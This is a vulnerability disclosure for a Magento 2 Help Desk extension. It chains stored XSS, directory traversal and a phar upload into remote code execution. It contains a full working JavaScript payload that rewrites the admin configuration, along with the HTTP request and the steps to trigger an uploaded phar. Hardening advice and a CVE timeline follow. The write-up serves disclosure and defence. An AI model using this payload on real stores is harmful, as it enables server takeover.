

# XSS to RCE via a Magento Help Desk extension

The Mangento 2 Help Desk extension from Wyomind [1,2] up to and including version 1.3.6 is vulnerable to stored XSS, directory traversal and unrestricted upload of a dangerous file type. These vulnerabilites combined could lead to code execution.

This was tested with default settings on Ubuntu 18.04-20.04, latest Apache, PHP 7.2 and Magento 2.4.

## Details

A XSS payload can be sent via a ticket message from the front-end in the 'Support - My tickets' section. 
The payload is triggered when an administrator views the ticket in the Magento 2 backend. The following request enable
the delivery of the XSS payload:

```
POST /helpdesk/customer/ticket_save/ HTTP/1.1
Host: <redacted>
Content-Type: multipart/form-data; boundary=---------------------------243970849510445067673127196635
Content-Length: 683
Origin: https://<redacted>
Connection: close
Referer: https://<redacted>/helpdesk/customer/ticket_view/
Cookie: <redacted>
Upgrade-Insecure-Requests: 1

-----------------------------243970849510445067673127196635
Content-Disposition: form-data; name="form_key"

<redacted>
-----------------------------243970849510445067673127196635
Content-Disposition: form-data; name="object"

Hello
-----------------------------243970849510445067673127196635
Content-Disposition: form-data; name="message_cc"


-----------------------------243970849510445067673127196635
Content-Disposition: form-data; name="content"

<p><script>alert(1)</script></p>
-----------------------------243970849510445067673127196635
Content-Disposition: form-data; name="hideit"


-----------------------------243970849510445067673127196635--
```

This request can be used to deliver the XSS payload and triggering the other vulnerabilites, specifically: 

1. Enabling file attachments in ticket messages
2. Adding `phar` to allowed file extensions
3. Setting the attachment directory to `helpdesk/files/../../../pub`

Full payload performing the above actions:

```
<script>
function successListener(e) {    
	var doc = e.target.response
	var action=doc.getElementById('config-edit-form').action;
	
	function submitRequest()
	{
	var formKey = FORM_KEY;
	var xhr = new XMLHttpRequest();
	xhr.open("POST", action, true);
	xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=---------------------------14303502862141221692667966053");
	xhr.withCredentials = true;
	var body = "-----------------------------14303502862141221692667966053\r\n" + 
	  "Content-Disposition: form-data; name=\"form_key\"\r\n" + 
	  "\r\n" + 
	  formKey + "\r\n" + 
	  "-----------------------------14303502862141221692667966053\r\n" + 
	  "Content-Disposition: form-data; name=\"config_state[wyomind_helpdesk_license]\"\r\n" + 
	  "\r\n" + 
	  "0\r\n" + 
	  "-----------------------------14303502862141221692667966053\r\n" + 
	  "Content-Disposition: form-data; name=\"config_state[wyomind_helpdesk_general]\"\r\n" + 
	  "\r\n" + 
	  "1\r\n" + 
	  "-----------------------------14303502862141221692667966053\r\n" + 
	  "Content-Disposition: form-data; name=\"groups[general][fields][enabled][value]\"\r\n" + 
	  "\r\n" + 
	  "1\r\n" + 
	  "-----------------------------14303502862141221692667966053\r\n" + 
	  "Content-Disposition: form-data; name=\"groups[general][fields][log][value]\"\r\n" + 
	  "\r\n" + 
	  "0\r\n" + 
	  "-----------------------------14303502862141221692667966053\r\n" + 
	  "Content-Disposition: form-data; name=\"groups[general][fields][default_email][value]\"\r\n" + 
	  "\r\n" + 
	  "\r\n" + 
	  "-----------------------------14303502862141221692667966053\r\n" + 
	  "Content-Disposition: form-data; name=\"groups[general][fields][default_status][value]\"\r\n" + 
	  "\r\n" + 
	  "1\r\n" + 
	  "-----------------------------14303502862141221692667966053\r\n" + 
	  "Content-Disposition: form-data; name=\"groups[general][fields][pending_status][value]\"\r\n" + 
	  "\r\n" + 
	  "2\r\n" + 
	  "-----------------------------14303502862141221692667966053\r\n" + 
	  "Content-Disposition: form-data; name=\"groups[general][fields][closed_status][value]\"\r\n" + 
	  "\r\n" + 
	  "3\r\n" + 
	  "-----------------------------14303502862141221692667966053\r\n" + 
	  "Content-Disposition: form-data; name=\"groups[general][fields][ticket_prefix][value]\"\r\n" + 
	  "\r\n" + 
	  "10000\r\n" + 
	  "-----------------------------14303502862141221692667966053\r\n" + 
	  "Content-Disposition: form-data; name=\"config_state[wyomind_helpdesk_frontend]\"\r\n" + 
	  "\r\n" + 
	  "1\r\n" + 
	  "-----------------------------14303502862141221692667966053\r\n" + 
	  "Content-Disposition: form-data; name=\"groups[frontend][fields][menu_label][value]\"\r\n" + 
	  "\r\n" + 
	  "Support - My Tickets\r\n" + 
	  "-----------------------------14303502862141221692667966053\r\n" + 
	  "Content-Disposition: form-data; name=\"groups[frontend][fields][top_link_enabled][value]\"\r\n" + 
	  "\r\n" + 
	  "1\r\n" + 
	  "-----------------------------14303502862141221692667966053\r\n" + 
	  "Content-Disposition: form-data; name=\"groups[frontend][fields][attachments][value]\"\r\n" + 
	  "\r\n" + 
	  "1\r\n" + 
	  "-----------------------------14303502862141221692667966053\r\n" + 
	  "Content-Disposition: form-data; name=\"config_state[wyomind_helpdesk_frontend_attachments_settings]\"\r\n" + 
	  "\r\n" + 
	  "1\r\n" + 
	  "-----------------------------14303502862141221692667966053\r\n" + 
	  "Content-Disposition: form-data; name=\"groups[frontend][groups][attachments_settings][fields][attachments_extension][value]\"\r\n" + 
	  "\r\n" + 
	  "jpeg,gif,png,pdf,phar\r\n" + 
	  "-----------------------------14303502862141221692667966053\r\n" + 
	  "Content-Disposition: form-data; name=\"groups[frontend][groups][attachments_settings][fields][attachments_directory_path][value]\"\r\n" + 
	  "\r\n" + 
	  "helpdesk/files/../../../pub\r\n" + 
	  "-----------------------------14303502862141221692667966053\r\n" + 
	  "Content-Disposition: form-data; name=\"groups[frontend][groups][attachments_settings][fields][attachments_upload_max_filesize][value]\"\r\n" + 
	  "\r\n" + 
	  "2M\r\n" + 
	  "-----------------------------14303502862141221692667966053\r\n" + 
	  "Content-Disposition: form-data; name=\"groups[frontend][groups][attachments_settings][fields][attachments_post_max_size][value]\"\r\n" + 
	  "\r\n" + 
	  "4M\r\n" + 
	  "-----------------------------14303502862141221692667966053\r\n" + 
	  "Content-Disposition: form-data; name=\"config_state[wyomind_helpdesk_emails]\"\r\n" + 
	  "\r\n" + 
	  "1\r\n" + 
	  "-----------------------------14303502862141221692667966053\r\n" + 
	  "Content-Disposition: form-data; name=\"config_state[wyomind_helpdesk_emails_customer_settings]\"\r\n" + 
	  "\r\n" + 
	  "0\r\n" + 
	  "-----------------------------14303502862141221692667966053\r\n" + 
	  "Content-Disposition: form-data; name=\"groups[emails][groups][customer_settings][fields][confirmation_enabled][value]\"\r\n" + 
	  "\r\n" + 
	  "0\r\n" + 
	  "-----------------------------14303502862141221692667966053\r\n" + 
	  "Content-Disposition: form-data; name=\"groups[emails][groups][customer_settings][fields][confirmation_content][value]\"\r\n" + 
	  "\r\n" + 
	  "Dear {{customer_firstname}},\x3cbr/\x3e\x3cbr/\x3e\r\n" + 
	  "Your message has been sent to the support team.\r\n" + 
	  "Here is the message content:\x3cbr/\x3e\r\n" + 
	  "\"{{message}}\" \x3cbr/\x3e\x3cbr/\x3e\r\n" + 
	  "Kind Regards,\r\n" + 
	  "The Support Team.\r\n" + 
	  "-----------------------------14303502862141221692667966053\r\n" + 
	  "Content-Disposition: form-data; name=\"groups[emails][groups][customer_settings][fields][notification_enabled][value]\"\r\n" + 
	  "\r\n" + 
	  "0\r\n" + 
	  "-----------------------------14303502862141221692667966053\r\n" + 
	  "Content-Disposition: form-data; name=\"groups[emails][groups][customer_settings][fields][notification_content][value]\"\r\n" + 
	  "\r\n" + 
	  "Hello {{customer_firstname}},\x3cbr/\x3e\x3cbr/\x3e\r\n" + 
	  "Your ticket \"{{ticket_object}}\" (#{{prefixed_id}}) has been updated.\r\n" + 
	  "Please login to your account via this link in order to see the new message: {{customer_account_link}}\x3cbr/\x3e\x3cbr/\x3e\r\n" + 
	  "Regards,\r\n" + 
	  "The Support Team.\r\n" + 
	  "-----------------------------14303502862141221692667966053\r\n" + 
	  "Content-Disposition: form-data; name=\"config_state[wyomind_helpdesk_emails_support_team_settings]\"\r\n" + 
	  "\r\n" + 
	  "0\r\n" + 
	  "-----------------------------14303502862141221692667966053\r\n" + 
	  "Content-Disposition: form-data; name=\"groups[emails][groups][support_team_settings][fields][notification_enabled][value]\"\r\n" + 
	  "\r\n" + 
	  "0\r\n" + 
	  "-----------------------------14303502862141221692667966053\r\n" + 
	  "Content-Disposition: form-data; name=\"groups[emails][groups][support_team_settings][fields][notification_content][value]\"\r\n" + 
	  "\r\n" + 
	  "You received a new message from a customer.\r\n" + 
	  "-----------------------------14303502862141221692667966053--\r\n";
	var aBody = new Uint8Array(body.length);
	for (var i = 0; i < aBody.length; i++)
	aBody[i] = body.charCodeAt(i); 
	xhr.send(new Blob([aBody]));
	}
	submitRequest();
}
	
var request = new XMLHttpRequest();  
request.onload = successListener;    
request.responseType = 'document';
request.open('GET', document.querySelector('[data-ui-id="menu-wyomind-helpdesk-configuration"]').querySelector('a').href, true);  
request.send();
</script> 
```

After the XSS payload is executed by an administrator, it is possible to upload a `phar` file by attaching files to ticket messages. Upon successful upload, the uploaded files can be triggered to execute by requesting

```
https://[HOSTNAME]/<ticketId>/<messageId>/filename.phar
```

`ticketId` and `messageId` can be identified after sending the ticket message with the attached `phar` file. The `ticketId` is visible in the 
URL, for example: 

```
https://[HOSTNAME]/helpdesk/customer/ticket_view/ticket_id/7/
```

and the `messageId` can be identified by hovering over the uploaded file link which will be similar to something like:

```
https://[HOSTNAME]/helpdesk/customer/message_downloadAttachment/message/40/file/filename.phar
```

in this case, the `messageId` is `40`.

The full proof of concept in action can be seen in [3].


## Analysis

To my understanding, the incomplete list of disallowed file extensions in Magento2 is referred to as protected extensions [4]. This can also be verified in the Magento2 admin interface by navigating to `Catalog->Product` and adding a downloadable product, and successfully uploading a `phar` file, see Figure 1. Note that `php` files and other dangerous files are blocked.

<p align="center">
  <img src="https://github.com/pjlantz/pjlantz.github.io/raw/master/docs/assets/phar.png?raw=true" alt="TEE overview" width="75%" height="75%"/>
      <br /><em>Figure 1. Successful upload of a phar file.</em>
</p>


The list containing protected extensions can be found in

```
vendor/magento/module-store/etc/config.xml
```

under the Magento root dir. This config file has the following list of extensions by default:

```
<protected_extensions>
   <php>php</php>
   <php3>php3</php3>
   <php4>php4</php4>
   <php5>php5</php5>
   <php7>php7</php7>
   <htaccess>htaccess</htaccess>
   <jsp>jsp</jsp>
   <pl>pl</pl>
   <py>py</py>
   <asp>asp</asp>
   <sh>sh</sh>
   <cgi>cgi</cgi>
   <htm>htm</htm>
   <html>html</html>
   <phtml>phtml</phtml>
   <shtml>shtml</shtml>
   <phpt>phpt</phpt>
   <pht>pht</pht>
   <svg>svg</svg>
   <xml>xml</xml>
   <xhtml>xhtml</xhtml>
</protected_extensions>
```

`phar` files seem to be executed by the web server and PHP using default settings in the environment where this was tested on. Much like the scenario described with the Help Desk extension, the risk lies in extensions enabling such files to be uploaded and executed.

A recommendation for hardening a Magento instance is therefore to add `<phar>phar</phar>` to this list, and then refreshing the cache in the Magento2 administrative interface in order to complete the addition of `phar` files to the list of disallowed extensions. Again, this can be verified by adding downloadable products and trying to upload a `phar` file and it will now instead provide with an error about disallowed file type.

## Timeline

- 2021-03 - Vendor is notified about the vulnerabilites.
- 2021-03 - CVE request is made.
- 2021-04 - Vendor release patched version.
- 2021-04 - Adobe is contacted regarding the issue with dangerous file extensions. 
- 2021-05 - Adobe does not consider it to be a security issue.
- 2021-07 - MITRE is contacted regarding the CVE request. Response is that there is a long backlog with requests.
- 2023-02 - MITRE issues CVEs CVE-2021-33351, CVE-2021-33352, CVE-2021-33353.


## References

[1] Wyomind Help Desk - https://www.wyomind.com/magento2/helpdesk-magento-2.html

[2] Help Desk at Magento Marketplace - https://marketplace.magento.com/wyomind-helpdesk-meta.html

[3] PoC in action - https://vimeo.com/manage/videos/660619348?quality=1080p

[4] Magento2 Github - https://github.com/magento/magento2/blob/2.4.2/app/code/Magento/Store/etc/config.xml
